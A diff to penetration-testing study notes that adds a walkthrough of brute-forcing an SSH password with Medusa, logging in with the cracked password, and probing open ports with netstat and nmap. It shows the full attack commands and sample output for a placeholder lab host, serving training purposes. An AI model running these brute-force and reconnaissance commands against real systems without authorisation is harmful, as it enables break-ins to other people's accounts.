@@ -592,4 +592,62 @@ Medusa will try **each username** with an **empty password** and then with the p
 ## Web Services
 Maintaining robust authentication mechanisms is paramount. While technologies like **Secure Shell** (**SSH**) and **File Transfer Protocol** (**FTP**) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks.
 
-In this section, we will delve into the practical application of **Medusa**, a potent brute-forcing tool, to systematically compromise both SSH and FTP services, thereby illustrating potential attack vectors and emphasizing the importance of fortified authentication practices.
+In this section, we will delve into the practical application of **Medusa**, to systematically compromise both **SSH** and **FTP** services.
+
+**SSH** is a **cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network**. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols like **Telnet**. 
+However, **weak or easily guessable passwords can undermine SSH's security**, exposing it to brute-force attacks.
+
+**FTP** is a standard network protocol for **transferring files between a client and a server** on a computer network. **It's also widely used for uploading and downloading files from websites**. However, standard **FTP transmits data, including login credentials, in cleartext**, rendering it susceptible to interception and brute-forcing.
+## Attack example
+We begin our exploration by targeting an **SSH** server. Assuming prior knowledge of the **username** `sshuser`, we can leverage **Medusa** to brute force the password.
+
+The following command serves as our starting point:
+```bash
+$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
+```
+Where:
+- `-h <IP>`: Specifies the target system's **IP** address.
+- `-n <PORT>`: Defines the port on which the **SSH** service is listening (**typically port 22**).
+- `-u sshuser`: Sets the **username** for the brute-force attack.
+- `-P 2023-200_most_used_passwords.txt`: Points **Medusa** to a wordlist containing the 200 most commonly used passwords in 2023.
+- `-M ssh`: Selects the **SSH module** within **Medusa**, tailoring the attack specifically for **SSH** authentication.
+- `-t 3`: The number of parallel login attempts to execute concurrently. Increasing can speed up the attack but may also increase the likelihood of **detection** or **triggering security measures** on the target system.
+```bash
+medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
+
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+...
+ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
+```
+Medusa will display its progress as it cycles through the password combinations. The output will indicate a successful login, revealing the correct password.
+
+### Gaining Access
+With the password, establish an **SSH** connection using the following command and enter the found password when prompted:
+```bash
+$ ssh sshuser@<IP> -p PORT
+```
+This will initiate an **interactive SSH session**, granting you access to the remote system's command line.
+### Expanding the Attack Surface
+Once inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the **SSH** session) to list **open ports** and **listening services**:
+```bash
+$ netstat -tulpn | grep LISTEN
+- - - - - 
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::21                   :::*                    LISTEN      -
+```
+You discover a service running on port 21.
+ 
+Further reconnaissance with `nmap` (within the **SSH** session) confirms this finding as an **FTP** server:
+```bash
+$ nmap localhost
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC
+... SNI
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+
+Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
+```
+
